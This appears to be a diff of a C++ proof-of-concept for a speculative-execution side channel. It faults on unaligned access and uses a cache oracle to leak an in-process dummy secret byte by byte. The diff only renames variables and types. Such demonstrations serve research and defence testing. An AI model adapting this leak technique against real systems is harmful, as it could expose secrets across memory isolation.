@@ -40,7 +40,6 @@
 
 #include <array>
 #include <cstring>
-#include <fstream>
 #include <iostream>
 
 #include <signal.h>
@@ -52,28 +51,29 @@ const char *public_data = "Hello, world!";
 const char *private_data = "It's a s3kr3t!!!";
 
 // Storage for the public data.
-size_t *public_array = new size_t[strlen(public_data) + 1];
-// Disaligned array of public data shifted by one byte.
-size_t *disaligned_public_data = reinterpret_cast<size_t *>(
+// Must be at least a native word size. That's why we pick uintptr_t.
+uintptr_t *public_array = new uintptr_t[strlen(public_data) + 1];
+// Unaligned array of public data shifted by one byte.
+uintptr_t *unaligned_public_data = reinterpret_cast<uintptr_t *>(
     reinterpret_cast<char *>(public_array) + 1);
 
 // Storage for the private data.
-size_t *private_array = new size_t[strlen(private_data) + 1];
-// Disaligned array of private data shifted by one byte.
-size_t *disaligned_private_data = reinterpret_cast<size_t *>(
+uintptr_t *private_array = new uintptr_t[strlen(private_data) + 1];
+// Unaligned array of private data shifted by one byte.
+uintptr_t *unaligned_private_data = reinterpret_cast<uintptr_t *>(
     reinterpret_cast<char *>(private_array) + 1);
 
-static void InitializeDisalignedData() {
-  // Initialize disaligned arrays.
+static void InitializeUnalignedData() {
+  // Initialize unaligned arrays.
   for (size_t i = 0; i < strlen(public_data); ++i) {
-    disaligned_public_data[i] = public_data[i];
+    unaligned_public_data[i] = public_data[i];
   }
   for (size_t i = 0; i < strlen(private_data); ++i) {
-    disaligned_private_data[i] = private_data[i];
+    unaligned_private_data[i] = private_data[i];
   }
 }
 
-static char LeakByte(size_t *disaligned_data, size_t offset) {
+static char LeakByte(uintptr_t *unaligned_data, size_t offset) {
   CacheSideChannel sidechannel;
   const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
 
@@ -83,13 +83,13 @@ static char LeakByte(size_t *disaligned_data, size_t offset) {
 
     // Successful execution accesses safe_offset and loads ForceRead code into
     // cache.
-    ForceRead(isolated_oracle.data() + disaligned_data[safe_offset]);
+    ForceRead(isolated_oracle.data() + unaligned_data[safe_offset]);
 
     EnforceAlignment();
     MemoryAndSpeculationBarrier();
 
     // Accesses unaligned data despite of the enforcement. Triggers SIGBUS.
-    ForceRead(isolated_oracle.data() + disaligned_data[offset]);
+    ForceRead(isolated_oracle.data() + unaligned_data[offset]);
 
     // Architecturally dead code. Never reached unless AM flag in CR0 is off.
     std::cout << "Dead code. Must not be printed. "
@@ -144,13 +144,13 @@ static void SetSignal() {
 }
 
 int main() {
-  InitializeDisalignedData();
+  InitializeUnalignedData();
   SetSignal();
   std::cout << "Leaking the string: ";
   std::cout.flush();
-  size_t private_offset = disaligned_private_data - disaligned_public_data;
+  size_t private_offset = unaligned_private_data - unaligned_public_data;
   for (size_t i = 0; i < strlen(private_data); ++i) {
-    std::cout << LeakByte(disaligned_public_data, private_offset + i);
+    std::cout << LeakByte(unaligned_public_data, private_offset + i);
     std::cout.flush();
   }
   std::cout << "\nDone!\n";
